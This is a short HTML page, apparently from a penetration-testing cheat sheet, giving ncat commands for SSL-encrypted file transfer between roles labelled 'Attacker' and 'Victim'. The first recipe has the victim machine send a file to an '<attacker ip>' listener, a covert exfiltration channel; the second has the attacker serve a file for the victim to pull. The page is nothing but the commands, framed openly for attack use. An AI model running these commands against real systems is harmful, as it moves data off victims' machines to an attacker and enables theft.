<title>File Transfer with SSL</title>
</head><body><b>File Transfer with SSL</b><br/>
Reverse file transfer to attacker<br/>
Attacker<br/>
<br/>
ncat -l -p 6666 --ssl &gt; outputfile<br/>
<br/>
Victim<br/>
<br/>
ncat --ssl --send-only &lt;attacker ip&gt; 6666 &lt; /bin/ncat<br/>
<br/>
<b>File send w/ Sender listening</b><br/>
Attacker<br/>
<br/>
ncat -l -ssl -p 6666 --send-only &lt; /bin/ncat<br/>
<br/>
Victim<br/>
<br/>
ncat localhost 6666 --ssl &gt; outputfile<br/>
<br/>
